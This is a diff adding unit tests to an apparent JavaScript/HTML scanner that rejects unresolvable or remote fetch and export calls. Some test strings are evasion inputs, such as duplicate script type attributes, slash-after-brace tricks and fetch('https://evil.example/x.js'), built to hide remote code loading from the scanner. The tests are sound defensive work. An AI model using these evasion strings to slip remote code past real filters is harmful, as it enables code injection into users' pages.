@@ -361,6 +361,52 @@ class LexerTests(unittest.TestCase):
             with self.subTest(attrs=attrs):
                 self.assertEqual(self.scan(f"<script{attrs}>{body}</script>", kind="raw"), [])
 
+    def test_duplicate_type_attributes_cannot_make_a_script_inert(self):
+        for attrs in (' type="module" type="text/plain"', ' type="text/plain" type="module"',
+                      ' type="x-shader/x-fragment" TYPE=text/javascript'):
+            with self.subTest(attrs=attrs):
+                self.assertRejected(f"<script{attrs}>fetch(variable);</script>",
+                                    "cannot statically resolve fetch", kind="raw")
+        self.assertRejected('<script type="importmap" type="text/plain">{}</script>', "not supported", kind="raw")
+        self.assertEqual(self.scan('<script type="text/plain" type="application/json">fetch(</script>', kind="raw"), [])
+
+    def test_slash_after_a_closing_brace_or_paren_cannot_hide_code(self):
+        for js in ("x = {}/2; fetch('https://evil.example/x.js'); y = x/2;",
+                   "x = {}/2; fetch(variable); y = x/2;",
+                   "x = (a)/2; fetch(variable); y = (b)/2;",
+                   "x = (a)/2; fetch('https://evil.example/x.js'); y = (b)/2;",
+                   "x = `${ {}/2 }`; fetch(variable); y = `${ {}/2 }`;",
+                   "if (a) /\"/.test(b); fetch(variable); z = \"q\";"):
+            with self.subTest(js=js):
+                self.assertTrue(self.scan(js), js)
+
+    def test_slash_after_a_closing_brace_or_paren_is_otherwise_accepted(self):
+        for js in ("const h = (a + b) / 2, k = (c)/3, m = {a: 1}.a / 2 + 1 / 3;",
+                   "function f(){}\n/x/.test(s);",
+                   "if (a) /x/.test(b);",
+                   "const o = {}; const v = (o.a)/2 + (o.b)/4;",
+                   "const m = `${ {}/2 } ${ (a)/3 }`;"):
+            with self.subTest(js=js):
+                self.assertEqual(self.scan(js), [])
+
+    def test_export_from_references_are_checked(self):
+        for js, needle in (("export * from 'missing.js';", "not on the allowlist"),
+                           ("export * as ns from 'https://example.test/x.js';", "remote"),
+                           ("export {a} from 'missing.js';", "not on the allowlist"),
+                           ("export {\n  a,\n  b as c\n} from 'missing.js';", "not on the allowlist"),
+                           ("export { a as default } from 'https://example.test/x.js'", "remote"),
+                           ("export * from variable;", "cannot statically resolve export"),
+                           ("export { 'a}' as b } from 'missing.js';", "cannot statically resolve export")):
+            with self.subTest(js=js):
+                self.assertRejected(js, needle)
+
+    def test_local_exports_and_allowlisted_re_exports_pass(self):
+        for js in ("export * from 'ok.js';", "export * as ns from 'ok.js';", "export {a} from \"ok.js\";",
+                   "const a = 1; export {a}; export {a as b};", "export const x = 1; export default function(){}",
+                   "export default {from: 1};", "export function f(){ return /\"/.test(s); }"):
+            with self.subTest(js=js):
+                self.assertEqual(self.scan(js), [])
+
     def test_script_text_split_across_parser_chunks_is_one_unit(self):
         js = "const a = 'x < y'; const b = a < 2 && 3 > 1; fetch(variable);"
         self.assertRejected(js, "cannot statically resolve fetch")
